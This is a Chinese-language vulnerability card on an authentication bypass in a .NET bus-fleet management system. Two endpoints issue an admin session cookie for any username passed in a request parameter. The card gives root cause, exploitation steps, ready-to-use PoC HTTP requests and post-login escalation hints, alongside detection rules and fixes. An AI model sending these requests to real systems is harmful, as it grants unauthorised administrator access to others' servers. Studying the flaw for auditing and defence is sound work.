---
id: web-generic-auth-dotnet-setauthcookie-before-check-useraccount
title: .NET Handler/WebMethod 在鉴权前用 useraccount 调 SetAuthCookie：伪造 admin 身份进入后台
type: scenario
domain: web
path: web/generic/auth
technique: dotnet-setauthcookie-before-auth-check
aliases:
- SetAuthCookie 身份伪造
- Arrange_Query.ashx 登录绕过
- ERPAPI.asmx 登录绕过
- useraccount=admin
- 海信智能公交登录绕过
tags:
- auth-bypass
- dotnet
- ashx
- asmx
- setauthcookie
- cookie
- identity-forgery
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: 7.0.0.0.R3
verification:
  verified_by: verifier-V35
  verified_at: '2026-11-05T06:03:40+08:00'
  notes: 已对照原文核对：Arrange_Query.ashx 先 SetAuthCookie(useraccount) 再 AshxAuthCheck，ERPAPI.asmx query_getworkordertypelist 从 paraList JSON 取 UserAccount 先 SetAuthCookie（后续异常不影响票据）；后台截图显示 admin 登录成功。未在本机复现，需目标存在该用户名。
---

## 一句话结论

某 .NET 公交管理系统的两个入口在“鉴权检查之前”就用请求里的 `useraccount`/`UserAccount` 调用 `YZAuthHelper.SetAuthCookie(UserAccount)` 并清除登出标记：`HisModules/OM/Plan/HandlerService/Arrange_Query.ashx` 直接读 query 参数 `useraccount`，`WebService/erpapi.asmx` 的 `query_getworkordertypelist` 从 JSON `paraList` 中取 `UserAccount`。攻击者只要传入系统内已存在的用户名（默认 `admin`），服务器就为该请求签发 admin 身份票据，后续 `AshxAuthCheck()` 或业务查询都在 admin 身份下执行，访问根路径即可直接进入后台。

## 原理

- `Arrange_Query`（`IHttpHandler, IRequiresSessionState`）的 `ProcessRequest` 顺序是：
  1. `action = ComFunction.GetRequestStr("action")`；
  2. `UserAccount = ComFunction.GetRequestStr("useraccount")`；
  3. 若 `UserAccount` 非空，执行 `YZAuthHelper.SetAuthCookie(UserAccount)` 与 `YZAuthHelper.ClearLogoutFlag()`；
  4. 然后才 `YZAuthHelper.AshxAuthCheck()`；
  5. 进入 `switch(action)` 分发业务方法（如 `GetPeiChePaiBanInfoList`）。
- `SetAuthCookie` 的语义是“为当前响应写入认证票据”，它信任传入的用户名并据此生成身份 Cookie；函数本身不校验密码、不校验调用者是否已登录，也不校验该用户名是否允许被当前请求者使用。把它放在 `AshxAuthCheck()` 之前，且参数直接来自 request，等于把签发任意用户票据的能力暴露给未认证请求。
- 第二个入口 `WebService/erpapi.asmx` 的 `query_getworkordertypelist(string paraList)`（后端 `App_Code/ERPAPI.cs`）解析 JSON `paraList`，取 `UserAccount`，同样在无任何身份校验的情况下调用 `SetAuthCookie(UserAccount)` 与 `ClearLogoutFlag()`，随后才调用 `GetCommand("Query_GetWorkOrderTypeList@", ...)`。即使后续业务因参数问题抛 `NullReferenceException`，`SetAuthCookie` 已经执行完毕，身份票据已写入，登录状态已建立。
- 根因是“先改身份、后做鉴权”的顺序倒置，加上 `useraccount` 参数没有与会话/密码/签名绑定；正确实现应先完成认证（校验密码/票据/SSO），再由可信服务端逻辑设置身份，并且只允许为已认证主体设置其自身身份。
- 利用只需要一个系统中存在的用户名（文章默认 `admin`），不需要口令、不需要短信/验证码；身份票据写入后，浏览器带着该 Cookie 访问根路径即可进入后台。

## 触发条件

- 目标为该公交管理系统 7.0.0.0.R3（文章标记的影响版本）。
- `Arrange_Query.ashx` 或 `erpapi.asmx` 可从攻击者网络访问，且未被网关/身份代理统一拦截。
- 攻击者知道一个系统中存在的用户名（默认 `admin`；也可通过登录报错、页面信息、枚举获得）。
- 目标使用 `YZAuthHelper` 的 Cookie 认证，且 `SetAuthCookie` 以传入字符串为身份、无额外签名校验。

## 利用步骤

1. 请求 `GET /HisModules/OM/Plan/HandlerService/Arrange_Query.ashx?useraccount=admin`，服务端执行 `SetAuthCookie("admin")`。
2. 浏览器/客户端保存响应设置的认证 Cookie，随后访问站点根路径 `/`，页面应显示已登录的 admin 后台（文章截图显示“海信智能公交企业管理系统”与“欢迎您超级管理员admin”）。
3. 若第一个入口不可用，改用 `GET /webservice/ERPAPI.asmx/query_getworkordertypelist?paraList={"UserAccount":"admin"}`；即使响应是 `NullReferenceException` 的 JSON，`SetAuthCookie` 已在异常前执行，仍可用返回的 Cookie 访问根路径进入后台。
4. 用后台功能验证权限（用户管理、车辆管理、系统管理等），并检查是否能进一步创建账号/修改配置。

## PoC

```http
### 入口一：ASHX Handler
GET /HisModules/OM/Plan/HandlerService/Arrange_Query.ashx?useraccount=admin HTTP/1.1
Host: target

### 入口二：ASMX WebMethod（JSON 参数放在 paraList）
GET /webservice/ERPAPI.asmx/query_getworkordertypelist?paraList=%7B%22UserAccount%22%3A%22admin%22%7D HTTP/1.1
Host: target
```

```text
入口一执行顺序：
  UserAccount = "admin"
  YZAuthHelper.SetAuthCookie("admin")   // 先签发 admin 身份
  YZAuthHelper.ClearLogoutFlag()
  YZAuthHelper.AshxAuthCheck()          // 后鉴权，此时已是 admin

入口二执行顺序：
  JObject jobject = ParseParaString(paraList)
  UserAccount = jobject["UserAccount"]  // "admin"
  YZAuthHelper.SetAuthCookie("admin")   // 先签发身份
  GetCommand("Query_GetWorkOrderTypeList@", ...) // 后续异常不影响已签发的 Cookie

验证：带响应 Cookie 访问 http://target/ ，后台显示“欢迎您超级管理员admin”。
文章附有后台截图；本卡未在本机复现。
```

## 变体与关联

- 变体（入口）：任何 `IHttpHandler`（`.ashx`）或 `.asmx` WebMethod 中先 `SetAuthCookie(用户输入)` 再鉴权的实现；审计时搜索 `SetAuthCookie(`、`FormsAuthentication.SetAuthCookie`、`ClearLogoutFlag`。
- 变体（参数位置）：`useraccount` 可来自 query、form、JSON 字段、Header；`ComFunction.GetRequestStr` 通常合并所有来源，参数位置不影响。
- 变体（用户名来源）：默认 `admin`；若系统有 `superadmin`/工号/手机号等账号，可逐个尝试；用户不存在时签发的 Cookie 可能无效，因此需要“已存在用户名”。
- 关联：同层“身份由客户端参数决定”的认证绕过卡；本卡的关键是函数调用顺序（SetAuthCookie 早于 AshxAuthCheck）而不是密码校验逻辑。
- 边界：若目标在网关/反向代理层先做了统一认证，或修复为“先鉴权、后设置身份/仅允许设置当前会话主体”，链路失效；伪造的 Cookie 只对使用同一认证机制的子应用有效。

## 检测与防御

- 请求检测：请求中出现 `useraccount=` 或 JSON `UserAccount` 字段且伴随后台路径、`.ashx`、`.asmx`；同一 IP 在未登录状态下直接请求会设置认证 Cookie 的接口；响应 `Set-Cookie` 与请求无任何认证凭据。
- 日志检测：`Arrange_Query.ashx`/`ERPAPI.asmx` 的访问日志中 `useraccount` 值异常；`SetAuthCookie` 调用后紧跟 `AshxAuthCheck`/业务命令；同一账号在极短时间内从不同 IP 建立会话。
- 修复：把 `SetAuthCookie` 移到认证成功之后；`useraccount` 不得由客户端直接决定身份，必须来自已校验的票据/会话/SSO 断言；`AshxAuthCheck` 应在任何身份变更前执行。
- 修复：`SetAuthCookie` 内部增加“当前请求是否已认证”“目标账号是否允许被设置”的校验；对身份 Cookie 做签名/加密并绑定服务端会话。
- 加固：网关层统一认证，直接拦截对 `.ashx`/`.asmx` 管理接口的未认证访问；对 `useraccount`、`UserAccount` 参数做白名单/移除；监控异常后台登录。
- 审计：搜索所有 `SetAuthCookie`、`ClearLogoutFlag`、`FormsAuthentication`、自定义 `AuthHelper` 的调用点，确认参数来源与调用顺序；重点检查 Handler/WebMethod 这类容易绕过 MVC 过滤器的入口。
